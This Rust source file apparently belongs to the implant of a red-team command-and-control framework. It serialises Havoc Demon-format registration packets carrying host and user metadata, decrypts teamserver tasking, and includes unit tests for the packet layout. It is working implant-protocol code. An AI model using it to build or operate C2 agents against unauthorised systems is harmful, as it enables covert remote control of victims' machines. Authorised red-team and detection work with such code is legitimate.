//! Demon binary protocol serialization for the Specter agent.
//!
//! Builds `DEMON_INIT` registration packets and parses teamserver acknowledgement
//! responses, matching the Havoc Demon wire format byte-for-byte.

pub use red_cell_common::agent_protocol::{
    AgentMetadata, build_callback_packet, build_init_packet, parse_init_ack,
    serialize_init_metadata,
};
use red_cell_common::crypto::{AgentCryptoMaterial, decrypt_agent_data_at_offset};
use red_cell_common::demon::DemonEnvelope;

use crate::error::SpecterError;

/// Decrypted tasking bytes returned from a callback response.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct TaskingResponse {
    /// Raw decrypted tasking bytes.
    pub decrypted: Vec<u8>,
    /// The next receive-side CTR block offset after consuming this response.
    pub next_recv_ctr_offset: u64,
}

/// Decrypt a callback response and calculate the next receive CTR block offset.
///
/// The teamserver may return either a full Demon envelope or only the encrypted
/// payload body.  This parser accepts either form and returns the raw decrypted
/// bytes for command dispatch.
pub fn parse_tasking_response(
    agent_id: u32,
    crypto: &AgentCryptoMaterial,
    recv_ctr_offset: u64,
    response_body: &[u8],
) -> Result<TaskingResponse, SpecterError> {
    if response_body.is_empty() {
        return Ok(TaskingResponse {
            decrypted: Vec::new(),
            next_recv_ctr_offset: recv_ctr_offset,
        });
    }

    let encrypted_payload = match DemonEnvelope::from_bytes(response_body) {
        Ok(envelope) => {
            if envelope.header.agent_id != agent_id {
                return Err(SpecterError::InvalidResponse("task envelope agent_id mismatch"));
            }
            envelope.payload
        }
        Err(_) => response_body.to_vec(),
    };

    let decrypted =
        decrypt_agent_data_at_offset(&crypto.key, &crypto.iv, recv_ctr_offset, &encrypted_payload)?;

    Ok(TaskingResponse {
        decrypted,
        next_recv_ctr_offset: recv_ctr_offset
            + red_cell_common::crypto::ctr_blocks_for_len(encrypted_payload.len()),
    })
}

/// Calculate the number of CTR blocks consumed by `byte_len` bytes.
pub fn ctr_blocks_for_len(byte_len: usize) -> u64 {
    red_cell_common::crypto::ctr_blocks_for_len(byte_len)
}

#[cfg(test)]
mod tests {
    use super::*;
    use red_cell_common::agent_protocol::{INIT_EXT_MONOTONIC_CTR, INIT_EXT_SEQ_PROTECTED};
    use red_cell_common::crypto::{
        AGENT_IV_LENGTH, AGENT_KEY_LENGTH, decrypt_agent_data, encrypt_agent_data_at_offset,
        generate_agent_crypto_material,
    };
    use red_cell_common::demon::{DEMON_MAGIC_VALUE, DemonCommand, DemonEnvelope};

    fn test_metadata() -> AgentMetadata {
        AgentMetadata {
            hostname: "DESKTOP-TEST".into(),
            username: "testuser".into(),
            domain_name: "WORKGROUP".into(),
            internal_ip: "192.168.1.100".into(),
            process_path: "C:\\Windows\\System32\\notepad.exe".into(),
            process_pid: 1234,
            process_tid: 5678,
            process_ppid: 900,
            process_arch: 2,
            elevated: false,
            base_address: 0x7FF6_0000_0000,
            os_major: 10,
            os_minor: 0,
            os_product_type: 1,
            os_service_pack: 0,
            os_build: 19045,
            os_arch: 9,
            sleep_delay: 5000,
            sleep_jitter: 10,
            kill_date: 0,
            working_hours: 0,
        }
    }

    #[test]
    fn build_init_packet_has_correct_header() {
        let crypto = generate_agent_crypto_material().expect("keygen");
        let agent_id = 0xAABB_CCDD;
        let metadata = test_metadata();
        let packet = build_init_packet(agent_id, &crypto, &metadata, None).expect("build");

        let envelope = DemonEnvelope::from_bytes(&packet).expect("parse envelope");
        assert_eq!(envelope.header.magic, DEMON_MAGIC_VALUE);
        assert_eq!(envelope.header.agent_id, agent_id);

        let command_id = u32::from_be_bytes(envelope.payload[0..4].try_into().expect("cmd"));
        let request_id = u32::from_be_bytes(envelope.payload[4..8].try_into().expect("req"));
        assert_eq!(command_id, u32::from(DemonCommand::DemonInit));
        assert_eq!(request_id, 0);
    }

    #[test]
    fn build_init_packet_contains_key_and_iv() {
        let crypto = generate_agent_crypto_material().expect("keygen");
        let agent_id = 0x1234_5678;
        let metadata = test_metadata();
        let packet = build_init_packet(agent_id, &crypto, &metadata, None).expect("build");

        let envelope = DemonEnvelope::from_bytes(&packet).expect("parse");
        let key_start = 8;
        let key_end = key_start + AGENT_KEY_LENGTH;
        let iv_end = key_end + AGENT_IV_LENGTH;
        assert_eq!(&envelope.payload[key_start..key_end], &crypto.key);
        assert_eq!(&envelope.payload[key_end..iv_end], &crypto.iv);
    }

    #[test]
    fn init_packet_encrypted_payload_decrypts_correctly() {
        let crypto = generate_agent_crypto_material().expect("keygen");
        let agent_id = 0xDEAD_CAFE;
        let metadata = test_metadata();
        let packet = build_init_packet(agent_id, &crypto, &metadata, None).expect("build");

        let envelope = DemonEnvelope::from_bytes(&packet).expect("parse");
        let encrypted_start = 8 + AGENT_KEY_LENGTH + AGENT_IV_LENGTH;
        let encrypted = &envelope.payload[encrypted_start..];
        let decrypted = decrypt_agent_data(&crypto.key, &crypto.iv, encrypted).expect("decrypt");

        let parsed_id = u32::from_be_bytes(decrypted[0..4].try_into().expect("id"));
        assert_eq!(parsed_id, agent_id);
    }

    #[test]
    fn build_init_packet_versioned_inserts_secret_version_before_encrypted_metadata() {
        let crypto = generate_agent_crypto_material().expect("keygen");
        let agent_id = 0x1122_3344;
        let metadata = test_metadata();
        let version = 9_u8;
        let packet = build_init_packet(agent_id, &crypto, &metadata, Some(version)).expect("build");

        let envelope = DemonEnvelope::from_bytes(&packet).expect("parse");
        let key_start = 8;
        let key_end = key_start + AGENT_KEY_LENGTH;
        let iv_end = key_end + AGENT_IV_LENGTH;
        assert_eq!(&envelope.payload[key_start..key_end], &crypto.key);
        assert_eq!(&envelope.payload[key_end..iv_end], &crypto.iv);
        assert_eq!(envelope.payload[iv_end], version);
        let encrypted = &envelope.payload[iv_end + 1..];
        let decrypted = decrypt_agent_data(&crypto.key, &crypto.iv, encrypted).expect("decrypt");
        let parsed_id = u32::from_be_bytes(decrypted[0..4].try_into().expect("id"));
        assert_eq!(parsed_id, agent_id);
    }

    #[test]
    fn init_metadata_has_monotonic_ctr_and_seq_protected_flags() {
        let agent_id = 0x1111_2222;
        let metadata = test_metadata();
        let buf = serialize_init_metadata(agent_id, &metadata).expect("serialize");

        let tail = &buf[buf.len() - 4..];
        let ext_flags = u32::from_be_bytes(tail.try_into().expect("4 bytes"));
        assert_ne!(ext_flags & INIT_EXT_MONOTONIC_CTR, 0, "INIT_EXT_MONOTONIC_CTR must be set");
        assert_ne!(ext_flags & INIT_EXT_SEQ_PROTECTED, 0, "INIT_EXT_SEQ_PROTECTED must be set");
    }

    #[test]
    fn init_metadata_hostname_round_trips() {
        let agent_id = 0x1111_2222;
        let metadata = test_metadata();
        let buf = serialize_init_metadata(agent_id, &metadata).expect("serialize");

        let hostname_len = u32::from_be_bytes(buf[4..8].try_into().expect("len")) as usize;
        let hostname = std::str::from_utf8(&buf[8..8 + hostname_len]).expect("utf8");
        assert_eq!(hostname, "DESKTOP-TEST");
    }

    #[test]
    fn parse_init_ack_valid() {
        let crypto = generate_agent_crypto_material().expect("keygen");
        let agent_id: u32 = 0xBEEF_CAFE;

        let ack_plaintext = agent_id.to_le_bytes();
        let ack_body =
            red_cell_common::crypto::encrypt_agent_data(&crypto.key, &crypto.iv, &ack_plaintext)
                .expect("encrypt");

        let blocks = parse_init_ack(&ack_body, agent_id, &crypto).expect("parse");
        assert!(blocks >= 1);
    }

    #[test]
    fn parse_init_ack_valid_with_hkdf_session_crypto() {
        let raw_crypto = generate_agent_crypto_material().expect("keygen");
        let session_crypto = red_cell_common::crypto::derive_session_keys(
            &raw_crypto.key,
            &raw_crypto.iv,
            b"listener-init-secret",
        )
        .expect("derive session keys");
        let agent_id: u32 = 0xBEEF_CAFE;

        let ack_plaintext = agent_id.to_le_bytes();
        let ack_body = red_cell_common::crypto::encrypt_agent_data(
            &session_crypto.key,
            &session_crypto.iv,
            &ack_plaintext,
        )
        .expect("encrypt");

        let blocks = parse_init_ack(&ack_body, agent_id, &session_crypto).expect("parse");
        assert!(blocks >= 1);
    }

    #[test]
    fn parse_init_ack_wrong_agent_id_fails() {
        let crypto = generate_agent_crypto_material().expect("keygen");
        let agent_id: u32 = 0xBEEF_CAFE;
        let wrong_id: u32 = 0x1111_1111;

        let ack_plaintext = wrong_id.to_le_bytes();
        let ack_body =
            red_cell_common::crypto::encrypt_agent_data(&crypto.key, &crypto.iv, &ack_plaintext)
                .expect("encrypt");

        let result = parse_init_ack(&ack_body, agent_id, &crypto);
        assert!(result.is_err());
    }

    #[test]
    fn parse_init_ack_empty_body_fails() {
        let crypto = generate_agent_crypto_material().expect("keygen");
        let result = parse_init_ack(&[], 0x1234, &crypto);
        assert!(result.is_err());
    }

    #[test]
    fn build_callback_packet_roundtrips() {
        let crypto = generate_agent_crypto_material().expect("keygen");
        let agent_id = 0xAAAA_BBBB;
        let command_id = u32::from(DemonCommand::CommandCheckin);
        let request_id = 42_u32;
        let seq_num = 7_u64;
        let payload_data = b"hello";

        let packet = build_callback_packet(
            agent_id,
            &crypto,
            0,
            seq_num,
            command_id,
            request_id,
            payload_data,
        )
        .expect("build");

        let envelope = DemonEnvelope::from_bytes(&packet).expect("parse");
        assert_eq!(envelope.header.agent_id, agent_id);
        let cmd = u32::from_be_bytes(envelope.payload[0..4].try_into().expect("cmd"));
        let req = u32::from_be_bytes(envelope.payload[4..8].try_into().expect("req"));
        assert_eq!(cmd, command_id);
        assert_eq!(req, request_id);

        let decrypted =
            decrypt_agent_data(&crypto.key, &crypto.iv, &envelope.payload[8..]).expect("decrypt");
        let decoded_seq = u64::from_le_bytes(decrypted[0..8].try_into().expect("seq"));
        assert_eq!(decoded_seq, seq_num);
        let plen = u32::from_be_bytes(decrypted[8..12].try_into().expect("len")) as usize;
        assert_eq!(&decrypted[12..12 + plen], payload_data);
    }

    #[test]
    fn utf16le_encoding_matches_havoc_format() {
        // Verify UTF-16LE encoding via serialize_init_metadata process_path field.
        // 'A' = U+0041 → UTF-16LE = [0x41, 0x00], length = 2 bytes.
        // process_path is the 5th field; skip: agent_id(4) + hostname + username + domain + ip.
        // Use a dedicated metadata with known hostname lengths to isolate process_path.
        let m = AgentMetadata {
            hostname: "H".into(),
            username: "U".into(),
            domain_name: "D".into(),
            internal_ip: "I".into(),
            process_path: "A".into(),
            process_pid: 0,
            process_tid: 0,
            process_ppid: 0,
            process_arch: 0,
            elevated: false,
            base_address: 0,
            os_major: 0,
            os_minor: 0,
            os_product_type: 0,
            os_service_pack: 0,
            os_build: 0,
            os_arch: 0,
            sleep_delay: 0,
            sleep_jitter: 0,
            kill_date: 0,
            working_hours: 0,
        };
        let buf = serialize_init_metadata(0, &m).expect("serialize");
        // agent_id(4) + hostname(4+1) + username(4+1) + domain_name(4+1) + internal_ip(4+1) = 24 bytes before process_path
        let offset = 4 + 5 + 5 + 5 + 5;
        let path_len =
            u32::from_be_bytes(buf[offset..offset + 4].try_into().expect("len")) as usize;
        assert_eq!(path_len, 2); // 'A' as UTF-16LE = 2 bytes
        assert_eq!(&buf[offset + 4..offset + 6], &[0x41, 0x00]);
    }

    #[test]
    fn header_size_field_is_correct() {
        let crypto = generate_agent_crypto_material().expect("keygen");
        let agent_id = 0x1234_5678;
        let metadata = test_metadata();
        let packet = build_init_packet(agent_id, &crypto, &metadata, None).expect("build");

        let declared_size = u32::from_be_bytes(packet[0..4].try_into().expect("size"));
        assert_eq!(declared_size as usize, packet.len() - 4);
    }

    #[test]
    fn parse_tasking_response_decrypts_raw_body_and_advances_recv_ctr() {
        let crypto = generate_agent_crypto_material().expect("keygen");
        let agent_id = 0x1357_2468;
        let recv_ctr_offset = 5;
        let plaintext = b"queued-tasking".to_vec();
        let encrypted =
            encrypt_agent_data_at_offset(&crypto.key, &crypto.iv, recv_ctr_offset, &plaintext)
                .expect("encrypt");

        let response =
            parse_tasking_response(agent_id, &crypto, recv_ctr_offset, &encrypted).expect("parse");

        assert_eq!(response.decrypted, plaintext);
        assert_eq!(
            response.next_recv_ctr_offset,
            recv_ctr_offset + ctr_blocks_for_len(encrypted.len())
        );
    }

    #[test]
    fn parse_tasking_response_decrypts_enveloped_body_and_advances_recv_ctr() {
        let crypto = generate_agent_crypto_material().expect("keygen");
        let agent_id = 0x2468_1357;
        let recv_ctr_offset = 9;
        let plaintext = b"command-stream".to_vec();
        let encrypted =
            encrypt_agent_data_at_offset(&crypto.key, &crypto.iv, recv_ctr_offset, &plaintext)
                .expect("encrypt");
        let envelope = DemonEnvelope::new(agent_id, encrypted.clone()).expect("envelope");

        let response =
            parse_tasking_response(agent_id, &crypto, recv_ctr_offset, &envelope.to_bytes())
                .expect("parse");

        assert_eq!(response.decrypted, plaintext);
        assert_eq!(
            response.next_recv_ctr_offset,
            recv_ctr_offset + ctr_blocks_for_len(encrypted.len())
        );
    }
}
